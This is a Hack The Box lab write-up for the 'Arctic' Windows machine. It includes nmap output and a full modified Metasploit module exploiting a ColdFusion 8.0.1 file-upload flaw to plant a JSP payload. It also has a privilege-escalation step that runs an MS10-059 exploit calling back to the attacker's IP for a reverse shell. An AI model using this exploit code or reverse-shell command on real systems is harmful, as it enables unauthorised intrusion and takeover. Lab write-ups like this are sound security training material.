@@ -1,0 +1,450 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Arctic - Hack The Box</title>
+  <meta name="description" content="Resolution of the Arctic machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Arctic - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/arctic">
+  <meta property="og:description" content="Resolution of the Arctic machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/arctic">
+  <meta name="twitter:title" content="Arctic - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Arctic machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/arctic/arctic-00-9abfd80c4c9d073b669fb92021a6cfd2584488622468e9ad9bb26b3dae593389.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/arctic/arctic-00-9abfd80c4c9d073b669fb92021a6cfd2584488622468e9ad9bb26b3dae593389.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Arctic - Hack The Box</h1>
+            <p>Resolution of the Arctic machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    July 5, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      5 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/arctic/arctic-00-9abfd80c4c9d073b669fb92021a6cfd2584488622468e9ad9bb26b3dae593389.png">
+  <img src="/assets/hackthebox/arctic/arctic-00-9abfd80c4c9d073b669fb92021a6cfd2584488622468e9ad9bb26b3dae593389.png" alt="Arctic banner" class="zooming" data-rjs="/assets/hackthebox/arctic/arctic-00-9abfd80c4c9d073b669fb92021a6cfd2584488622468e9ad9bb26b3dae593389.png" data-zooming-width="596" data-zooming-height="379" />
+</a></p>
+
+<p>Arctic is an easy level machine based on Windows, the initial approach is based on a <code class="highlighter-rouge">file upload vulnerability</code> present on Adobe <code class="highlighter-rouge">ColdFusion</code>, this vulnerability allow us to upload a malicious <code class="highlighter-rouge">JSP webshell</code> and gain access to the server. The privilege escalation process has two ways to exploit: <code class="highlighter-rouge">MS10-092</code> or <code class="highlighter-rouge">MS10-059</code>.</p>
+
+<h1 id="recon">Recon</h1>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.80 scan initiated Sun May 10 19:34:44 2020 as: nmap -sC -sV -T5 --min-parallelism=50 -n --min-rate=300 -oA arctic -p- 10.10.10.11</span>
+Nmap scan report <span class="k">for </span>10.10.10.11
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65532 filtered ports
+PORT      STATE SERVICE VERSION
+135/tcp   open  msrpc   Microsoft Windows RPC
+8500/tcp  open  fmtp?
+49154/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun May 10 19:39:22 2020 -- 1 IP address (1 host up) scanned in 277.56 seconds</span></code></pre></figure>
+
+<p>We noticed that there’s some ports opened, but the port 8500 caught our attention:</p>
+
+<p><a href="/assets/hackthebox/arctic/arctic-01-76e2fa282462c5e6fb8fe715123077d934a5b45962be2cef9869264843c0d29d.png">
+  <img src="/assets/hackthebox/arctic/arctic-01-76e2fa282462c5e6fb8fe715123077d934a5b45962be2cef9869264843c0d29d.png" alt="Arctic Recon" class="zooming" data-rjs="/assets/hackthebox/arctic/arctic-01-76e2fa282462c5e6fb8fe715123077d934a5b45962be2cef9869264843c0d29d.png" data-zooming-width="941" data-zooming-height="233" />
+</a></p>
+
+<p>In this port there’s a service named <code class="highlighter-rouge">Adobe ColdFusion</code>, version 8.</p>
+
+<p><a href="/assets/hackthebox/arctic/arctic-02-3ca11c873b12fca0051cb0cf1424b5aecf33aaf22d3cd43b94eff428f880bc7e.png">
+  <img src="/assets/hackthebox/arctic/arctic-02-3ca11c873b12fca0051cb0cf1424b5aecf33aaf22d3cd43b94eff428f880bc7e.png" alt="Arctic Recon" class="zooming" data-rjs="/assets/hackthebox/arctic/arctic-02-3ca11c873b12fca0051cb0cf1424b5aecf33aaf22d3cd43b94eff428f880bc7e.png" data-zooming-width="945" data-zooming-height="444" />
+</a></p>
+
+<p>After searching on Google for any suitable exploit, we found an interesting one:</p>
+
+<p><a href="https://www.exploit-db.com/exploits/16788" target="_blank">ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)</a></p>
+
+<h1 id="exploiting---fixing-and-using-a-metasploit-module">Exploiting - Fixing and using a Metasploit module</h1>
+
+<p>The above exploit is in reality a Metasploit module, it exploits a vulnerability where it’s possible to upload files (malicious webshell) directly to the web server throught a ColdFusion module named <code class="highlighter-rouge">FCKeditor</code>.</p>
+
+<p>This module is located at <code class="highlighter-rouge">exploit/windows/http/coldfusion_fckeditor</code>.</p>
+
+<p><a href="/assets/hackthebox/arctic/arctic-03-63495677db25ea9f4229cd1d29515bda63fb80a64bc910a0f03ba8116dfaa96a.png">
+  <img src="/assets/hackthebox/arctic/arctic-03-63495677db25ea9f4229cd1d29515bda63fb80a64bc910a0f03ba8116dfaa96a.png" alt="Arctic Exploit" class="zooming" data-rjs="/assets/hackthebox/arctic/arctic-03-63495677db25ea9f4229cd1d29515bda63fb80a64bc910a0f03ba8116dfaa96a.png" data-zooming-width="1099" data-zooming-height="279" />
+</a></p>
+
+<p>But there’s a big problem: this exploit doesn’t work as he should, part of his code is not compatible with the Arctic machine.</p>
+
+<p>I made some modifications in order to work properly:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="c1">##</span>
+<span class="c1"># This module requires Metasploit: https://metasploit.com/download</span>
+<span class="c1"># Current source: https://github.com/rapid7/metasploit-framework</span>
+<span class="c1">##</span>
+
+<span class="k">class</span> <span class="nc">MetasploitModule</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
+  <span class="no">Rank</span> <span class="o">=</span> <span class="no">ExcellentRanking</span>
+
+  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">HttpClient</span>
+
+  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
+    <span class="k">super</span><span class="p">(</span><span class="n">update_info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
+      <span class="s1">'Name'</span>           <span class="o">=&gt;</span> <span class="s1">'ColdFusion 8.0.1 Arbitrary File Upload and Execute'</span><span class="p">,</span>
+      <span class="s1">'Description'</span>    <span class="o">=&gt;</span> <span class="sx">%q{
+          This module exploits the Adobe ColdFusion 8.0.1 FCKeditor 'CurrentFolder' File Upload
+        and Execute vulnerability.
+      }</span><span class="p">,</span>
+      <span class="s1">'Author'</span>         <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'MC'</span> <span class="p">],</span>
+      <span class="s1">'License'</span>        <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span><span class="p">,</span>
+      <span class="s1">'Platform'</span>       <span class="o">=&gt;</span> <span class="s1">'win'</span><span class="p">,</span>
+      <span class="s1">'Privileged'</span>     <span class="o">=&gt;</span> <span class="kp">true</span><span class="p">,</span>
+      <span class="s1">'References'</span>     <span class="o">=&gt;</span>
+        <span class="p">[</span>
+          <span class="p">[</span> <span class="s1">'CVE'</span><span class="p">,</span> <span class="s1">'2009-2265'</span> <span class="p">],</span>
+          <span class="p">[</span> <span class="s1">'OSVDB'</span><span class="p">,</span> <span class="s1">'55684'</span><span class="p">],</span>
+        <span class="p">],</span>
+      <span class="s1">'Targets'</span>        <span class="o">=&gt;</span>
+        <span class="p">[</span>
+          <span class="p">[</span> <span class="s1">'Universal Windows Target'</span><span class="p">,</span>
+            <span class="p">{</span>
+              <span class="s1">'Arch'</span>     <span class="o">=&gt;</span> <span class="no">ARCH_X64</span><span class="p">,</span>
+              <span class="s1">'Payload'</span>  <span class="o">=&gt;</span>
+                <span class="p">{</span>
+                  <span class="s1">'DisableNops'</span> <span class="o">=&gt;</span> <span class="kp">true</span><span class="p">,</span>
+                <span class="p">},</span>
+            <span class="p">}</span>
+          <span class="p">],</span>
+        <span class="p">],</span>
+      <span class="s1">'DefaultOptions'</span> <span class="o">=&gt;</span>
+        <span class="p">{</span>
+          <span class="s1">'SHELL'</span> <span class="o">=&gt;</span> <span class="s1">'cmd.exe'</span>
+        <span class="p">},</span>
+      <span class="s1">'DefaultTarget'</span>  <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
+      <span class="s1">'DisclosureDate'</span> <span class="o">=&gt;</span> <span class="s1">'Jul 3 2009'</span>
+    <span class="p">))</span>
+
+    <span class="n">register_options</span><span class="p">(</span>
+      <span class="p">[</span>
+        <span class="no">OptString</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s1">'FCKEDITOR_DIR'</span><span class="p">,</span> <span class="p">[</span> <span class="kp">false</span><span class="p">,</span> <span class="s1">'The path to upload.cfm '</span><span class="p">,</span> <span class="s1">'/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm'</span> <span class="p">]),</span>
+      <span class="p">])</span>
+  <span class="k">end</span>
+
+  <span class="k">def</span> <span class="nf">exploit</span>
+
+    <span class="n">page</span>  <span class="o">=</span> <span class="n">rand_text_alpha_upper</span><span class="p">(</span><span class="nb">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="s2">".jsp"</span>
+
+    <span class="n">dbl</span> <span class="o">=</span> <span class="no">Rex</span><span class="o">::</span><span class="no">MIME</span><span class="o">::</span><span class="no">Message</span><span class="p">.</span><span class="nf">new</span>
+    <span class="n">dbl</span><span class="p">.</span><span class="nf">add_part</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="nf">encoded</span><span class="p">,</span> <span class="s2">"application/x-java-archive"</span><span class="p">,</span> <span class="kp">nil</span><span class="p">,</span> <span class="s2">"form-data; name=</span><span class="se">\"</span><span class="s2">newfile</span><span class="se">\"</span><span class="s2">; filename=</span><span class="se">\"</span><span class="si">#{</span><span class="n">rand_text_alpha_upper</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="si">}</span><span class="s2">.txt</span><span class="se">\"</span><span class="s2">"</span><span class="p">)</span>
+    <span class="n">file</span> <span class="o">=</span> <span class="n">dbl</span><span class="p">.</span><span class="nf">to_s</span>
+    <span class="n">file</span><span class="p">.</span><span class="nf">strip!</span>
+
+    <span class="n">print_status</span><span class="p">(</span><span class="s2">"Sending our POST request..."</span><span class="p">)</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">send_request_cgi</span><span class="p">(</span>
+      <span class="p">{</span>
+        <span class="s1">'uri'</span>		<span class="o">=&gt;</span> <span class="n">normalize_uri</span><span class="p">(</span><span class="n">datastore</span><span class="p">[</span><span class="s1">'FCKEDITOR_DIR'</span><span class="p">]),</span>
+        <span class="s1">'query'</span>		<span class="o">=&gt;</span> <span class="s2">"Command=FileUpload&amp;Type=File&amp;CurrentFolder=/</span><span class="si">#{</span><span class="n">page</span><span class="si">}</span><span class="s2">%00"</span><span class="p">,</span>
+        <span class="s1">'version'</span>	<span class="o">=&gt;</span> <span class="s1">'1.1'</span><span class="p">,</span>
+        <span class="s1">'method'</span>	<span class="o">=&gt;</span> <span class="s1">'POST'</span><span class="p">,</span>
+        <span class="s1">'ctype'</span>		<span class="o">=&gt;</span> <span class="s1">'multipart/form-data; boundary='</span> <span class="o">+</span> <span class="n">dbl</span><span class="p">.</span><span class="nf">bound</span><span class="p">,</span>
+        <span class="s1">'data'</span>		<span class="o">=&gt;</span> <span class="n">file</span><span class="p">,</span>
+      <span class="p">},</span> <span class="mi">20</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">res</span> <span class="n">and</span> <span class="n">res</span><span class="p">.</span><span class="nf">code</span> <span class="o">==</span> <span class="mi">200</span> <span class="n">and</span> <span class="n">res</span><span class="p">.</span><span class="nf">body</span> <span class="o">=~</span> <span class="sr">/OnUploadCompleted/</span> <span class="p">)</span>
+      <span class="n">print_status</span><span class="p">(</span><span class="s2">"Upload succeeded, file name </span><span class="si">#{</span><span class="n">page</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+      <span class="n">print_status</span><span class="p">(</span><span class="s2">"Executing payload..."</span><span class="p">)</span>
+
+      <span class="n">send_request_raw</span><span class="p">(</span>
+        <span class="p">{</span>
+          <span class="c1"># default path in Adobe ColdFusion 8.0.1.</span>
+          <span class="s1">'uri'</span>		<span class="o">=&gt;</span> <span class="s1">'/userfiles/file/'</span> <span class="o">+</span> <span class="n">page</span><span class="p">,</span>
+          <span class="s1">'method'</span>	<span class="o">=&gt;</span> <span class="s1">'GET'</span><span class="p">,</span>
+        <span class="p">},</span> <span class="mi">20</span><span class="p">)</span>
+      
+      <span class="kp">loop</span> <span class="k">do</span>
+        <span class="n">handler</span>
+        <span class="k">break</span> <span class="k">if</span> <span class="n">session_created?</span>
+      <span class="k">end</span>
+      
+    <span class="k">else</span>
+      <span class="n">print_error</span><span class="p">(</span><span class="s2">"Upload Failed..."</span><span class="p">)</span>
+      <span class="k">return</span>
+    <span class="k">end</span>
+
+  <span class="k">end</span>
+<span class="k">end</span></code></pre></figure>
+
+<p><a href="/assets/hackthebox/arctic/arctic-04-47a8e359c07e5543780f661db9a878f845c435e1938e936b1b3ed75ddd91a841.png">
+  <img src="/assets/hackthebox/arctic/arctic-04-47a8e359c07e5543780f661db9a878f845c435e1938e936b1b3ed75ddd91a841.png" alt="Arctic Exploit" class="zooming" data-rjs="/assets/hackthebox/arctic/arctic-04-47a8e359c07e5543780f661db9a878f845c435e1938e936b1b3ed75ddd91a841.png" data-zooming-width="751" data-zooming-height="382" />
+</a></p>
+
+<p>The problem was in the HTTP request timeout of the original module, I changed from 5 to 20 seconds. I also added a verification loop in the handler’s part to ensure that the metasploit session will be created.</p>
+
+<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that uploads a malicious JSP webshell throught the ColdFusion vulnerability, trigger the exploit and spawn an interactive shell to us, it’s available on my GitHub :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/arctic" target="_blank">Arctic Exploit</a></p>
+
+<p><a href="/assets/hackthebox/arctic/arctic-05-8cce2d94946b06d75a807e1c55d1a47159b5bf0ef605a5439d6a85b9c7856022.png">
+  <img src="/assets/hackthebox/arctic/arctic-05-8cce2d94946b06d75a807e1c55d1a47159b5bf0ef605a5439d6a85b9c7856022.png" alt="Arctic Exploit" class="zooming" data-rjs="/assets/hackthebox/arctic/arctic-05-8cce2d94946b06d75a807e1c55d1a47159b5bf0ef605a5439d6a85b9c7856022.png" data-zooming-width="685" data-zooming-height="187" />
+</a></p>
+
+<h1 id="post-exploitation---escalating-privileges-through-metasploit">Post Exploitation - Escalating privileges through Metasploit</h1>
+
+<p>Using a Metasploit post module named <code class="highlighter-rouge">local_exploit_suggester</code>, we got some interestings exploit suggestions:</p>
+
+<p><a href="/assets/hackthebox/arctic/arctic-06-801d45d3b9b3bc19a14266fcc5fcbdb4f56c117f58790e567b6c5a4a4e65baee.png">
+  <img src="/assets/hackthebox/arctic/arctic-06-801d45d3b9b3bc19a14266fcc5fcbdb4f56c117f58790e567b6c5a4a4e65baee.png" alt="Arctic Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/arctic/arctic-06-801d45d3b9b3bc19a14266fcc5fcbdb4f56c117f58790e567b6c5a4a4e65baee.png" data-zooming-width="773" data-zooming-height="165" />
+</a></p>
+
+<p>After testing exploit by exploit, we had success with <code class="highlighter-rouge">MS10-092</code>, Metasploit module <code class="highlighter-rouge">ms10_092_schelevator</code>:</p>
+
+<p><a href="/assets/hackthebox/arctic/arctic-07-0e9a5b2b409c2f0ab1aba6e875c62bf8b180607c6fbbf28dc6c161a8a2866159.png">
+  <img src="/assets/hackthebox/arctic/arctic-07-0e9a5b2b409c2f0ab1aba6e875c62bf8b180607c6fbbf28dc6c161a8a2866159.png" alt="Arctic Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/arctic/arctic-07-0e9a5b2b409c2f0ab1aba6e875c62bf8b180607c6fbbf28dc6c161a8a2866159.png" data-zooming-width="565" data-zooming-height="353" />
+</a></p>
+
+<h1 id="post-exploitation---manually-escalating-privileges">Post Exploitation - Manually escalating privileges</h1>
+
+<p>To manually exploit in this method, we need to execute a compiled exploit named <code class="highlighter-rouge">MS10-059</code>.
+The compiled exploit can be found here: <a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe" target="_blank">MS10-059.exe</a></p>
+
+<p>We set up a netcat on listening mode and execute the exploit with the following arguments:</p>
+
+<blockquote>
+  <p>MS10-059.exe 10.10.14.XX 4445</p>
+</blockquote>
+
+<p><a href="/assets/hackthebox/arctic/arctic-08-225bd9ac835e78ccbff51c9445ce7ad09f08e97846c60378ecc7ab72e363c114.png">
+  <img src="/assets/hackthebox/arctic/arctic-08-225bd9ac835e78ccbff51c9445ce7ad09f08e97846c60378ecc7ab72e363c114.png" alt="Arctic Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/arctic/arctic-08-225bd9ac835e78ccbff51c9445ce7ad09f08e97846c60378ecc7ab72e363c114.png" data-zooming-width="842" data-zooming-height="314" />
+</a></p>
+
+<p>Done, now we have system access as administrator!</p>
+
+<h1 id="post-exploitation---using-a-custom-exploit-to-escalate-privileges">Post Exploitation - Using a custom exploit to escalate privileges</h1>
+
+<p>For knowledge purposes I also made a custom exploit that uploads a malicious JSP webshell throught the ColdFusion vulnerability, trigger the exploit and spawn an interactive shell to us, in this version I added a privilege escalation exploit that executes the <code class="highlighter-rouge">MS10-059</code> automatically and give us another interactive shell but with NT AUTHORITY\SYSTEM privileges!</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/arctic" target="_blank">Arctic Exploit</a></p>
+
+<p><a href="/assets/hackthebox/arctic/arctic-09-87c44150d018b8346fc189f4f5512940198dc15c712932b7a2731b0f49b0c2d6.png">
+  <img src="/assets/hackthebox/arctic/arctic-09-87c44150d018b8346fc189f4f5512940198dc15c712932b7a2731b0f49b0c2d6.png" alt="Arctic Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/arctic/arctic-09-87c44150d018b8346fc189f4f5512940198dc15c712932b7a2731b0f49b0c2d6.png" data-zooming-width="692" data-zooming-height="379" />
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Arctic+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/arctic%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/arctic" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
